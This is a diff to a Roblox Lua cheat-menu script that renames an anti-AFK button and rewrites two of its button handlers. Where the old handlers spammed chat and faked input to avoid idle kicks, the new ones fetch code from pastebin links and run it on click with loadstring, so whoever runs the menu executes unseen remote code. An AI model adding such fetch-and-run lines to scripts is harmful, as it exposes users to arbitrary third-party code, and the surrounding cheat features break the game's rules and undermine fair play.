@@ -1713,7 +1713,7 @@ AntiAFK_Button.BorderSizePixel = 0
 AntiAFK_Button.Position = UDim2.new(0, 25, 0, 75)
 AntiAFK_Button.Size = UDim2.new(0, 150, 0, 30)
 AntiAFK_Button.Font = Enum.Font.Oswald
-AntiAFK_Button.Text = "دژە afk"
+AntiAFK_Button.Text = "کونترول"
 AntiAFK_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
 AntiAFK_Button.TextScaled = true
 AntiAFK_Button.TextSize = 14.000
@@ -3226,34 +3226,23 @@ end)
 
 
 
-
-
-
-
-
-
 AntiChatSpy_Button.MouseButton1Click:Connect(function()
-	ChangeToggleColor(AntiChatSpy_Button)
-	if AntiChatSpy_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
-		repeat task.wait()
-			Players:Chat(RandomChar())
-		until AntiChatSpy_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(255,0,0)
-	end
+	loadstring(game:HttpGet('https://pastebin.com/raw/Us3fs40Y'))()
 end)
 
-local AntiAFKFunction = nil
+
+
+
 AntiAFK_Button.MouseButton1Click:Connect(function()
-	ChangeToggleColor(AntiAFK_Button)
-	if AntiAFK_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
-		AntiAFKFunction = plr.Idled:Connect(function()
-			local VirtualUser = game:GetService("VirtualUser")
-			VirtualUser:CaptureController()
-			VirtualUser:ClickButton2(Vector2.new())
-		end)
-	else
-		AntiAFKFunction:Disconnect()
-	end
+	loadstring(game:HttpGet('https://pastebin.com/raw/YqYD9wbk'))()
 end)
+
+
+
+
+
+
+
 
 Shaders_Button.MouseButton1Click:Connect(function()
 	ChangeToggleColor(Shaders_Button)
